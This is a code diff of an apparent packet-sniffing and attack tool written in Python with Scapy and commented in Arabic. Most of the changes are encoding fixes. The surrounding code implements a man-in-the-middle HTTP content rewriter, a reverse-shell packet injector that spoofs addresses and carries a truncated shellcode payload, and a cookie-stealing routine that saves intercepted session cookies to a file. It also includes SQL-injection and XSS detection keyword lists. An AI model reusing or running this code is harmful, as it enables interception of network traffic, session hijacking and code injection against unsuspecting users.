@@ -295,7 +295,6 @@
 
 
 
-
 #New Dragon
 
 import scapy.all as scapy
@@ -323,12 +322,12 @@ import sys
 sys.stdout.reconfigure(encoding='utf-8')
 sys.stdin.reconfigure(encoding='utf-8')
 
-# إعدادات التسجيل (Logging)
+# إعداد نظام التسجيل (Logging)
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(levelname)s - %(message)s",
     handlers=[
-        logging.FileHandler("sniffer.log"),
+        logging.FileHandler("sniffer.log", encoding="utf-8"),  # استخدام ترميز UTF-8
         logging.StreamHandler()
     ]
 )
@@ -410,7 +409,7 @@ def mitm_attack(packet):
     """تنفيذ هجوم MITM."""
     try:
         if packet.haslayer(TCP) and packet.haslayer(Raw):
-            raw_data = packet[Raw].load.decode(errors='ignore')
+            raw_data = packet[Raw].load.decode(errors='replace')  # استبدال الأحرف غير المدعومة
             if "HTTP" in raw_data:
                 logging.info("MITM Attack: Intercepted HTTP data.")
                 modified_data = raw_data.replace("OriginalContent", "ModifiedContent")
@@ -424,7 +423,7 @@ def inject_reverse_shell(packet):
     """حقن شل عكسي."""
     if packet.haslayer(TCP) and packet.haslayer(Raw):
         raw_data = packet[Raw].load
-        if "HTTP" in raw_data.decode(errors='ignore'):
+        if "HTTP" in raw_data.decode(errors='replace'):  # استبدال الأحرف غير المدعومة
             reverse_shell_payload = b"\x31\xdb\xbb\x0b\xba\x01\x89\xe1..."
             new_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="A") / Raw(load=reverse_shell_payload)
             scapy.send(new_pkt, verbose=0)
@@ -433,12 +432,12 @@ def inject_reverse_shell(packet):
 def steal_cookies_and_sessions(packet):
     """سرقة ملفات تعريف الارتباط والجلسات."""
     if packet.haslayer(HTTPRequest) and packet.haslayer(Raw):
-        raw_data = packet[Raw].load.decode(errors='ignore')
+        raw_data = packet[Raw].load.decode(errors='replace')  # استبدال الأحرف غير المدعومة
         if "Cookie:" in raw_data:
             cookies = [line for line in raw_data.split("\r\n") if "Cookie:" in line]
             if cookies:
                 logging.info(f"Cookies Captured: {cookies}")
-                with open("stolen_cookies.txt", "a") as f:
+                with open("stolen_cookies.txt", "a", encoding="utf-8") as f:  # استخدام ترميز UTF-8
                     f.write(f"Captured at {datetime.now()} - {cookies}\n")
 
 # تحليل حركة TLS/SSL باستخدام pyshark
@@ -465,22 +464,22 @@ def port_scanning(packet):
 def detect_sql_injection(packet):
     """اكتشاف محاولات حقن SQL."""
     if packet.haslayer(Raw):
-        raw_data = packet[Raw].load.decode(errors='ignore').lower()
+        raw_data = packet[Raw].load.decode(errors='replace')  # استبدال الأحرف غير المدعومة
         sql_keywords = ['select', 'union', 'insert', 'drop', '--', ';--', 'or', 'and', '1=1']
         if any(keyword in raw_data for keyword in sql_keywords):
             logging.info(f"Potential SQL Injection Attempt Detected: {raw_data}")
-            with open("sql_injection_log.txt", "a") as f:
+            with open("sql_injection_log.txt", "a", encoding="utf-8") as f:  # استخدام ترميز UTF-8
                 f.write(f"Detected at {datetime.now()} - {raw_data}\n")
 
 # اكتشاف هجمات XSS
 def detect_xss(packet):
     """اكتشاف محاولات XSS."""
     if packet.haslayer(Raw):
-        raw_data = packet[Raw].load.decode(errors='ignore').lower()
+        raw_data = packet[Raw].load.decode(errors='replace')  # استبدال الأحرف غير المدعومة
         xss_patterns = ['<script>', 'onerror', 'alert(']
         if any(pattern in raw_data for pattern in xss_patterns):
             logging.info(f"Potential XSS Attempt Detected: {raw_data}")
-            with open("xss_log.txt", "a") as f:
+            with open("xss_log.txt", "a", encoding="utf-8") as f:  # استخدام ترميز UTF-8
                 f.write(f"Detected at {datetime.now()} - {raw_data}\n")
 
 # معالجة الحزم
@@ -589,14 +588,14 @@ class SnifferApp:
         file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON Files", "*.json"), ("CSV Files", "*.csv")])
         if file_path:
             if file_path.endswith(".json"):
-                with open(file_path, "w") as f:
+                with open(file_path, "w", encoding="utf-8") as f:  # استخدام ترميز UTF-8
                     cursor = self.conn.cursor()
                     cursor.execute("SELECT * FROM packets")
                     rows = cursor.fetchall()
                     json.dump([dict(zip([key[0] for key in cursor.description], row)) for row in rows], f, indent=4)
                 messagebox.showinfo("Success", "Packets exported to JSON successfully!")
             elif file_path.endswith(".csv"):
-                with open(file_path, "w") as f:
+                with open(file_path, "w", encoding="utf-8") as f:  # استخدام ترميز UTF-8
                     cursor = self.conn.cursor()
                     cursor.execute("SELECT * FROM packets")
                     rows = cursor.fetchall()
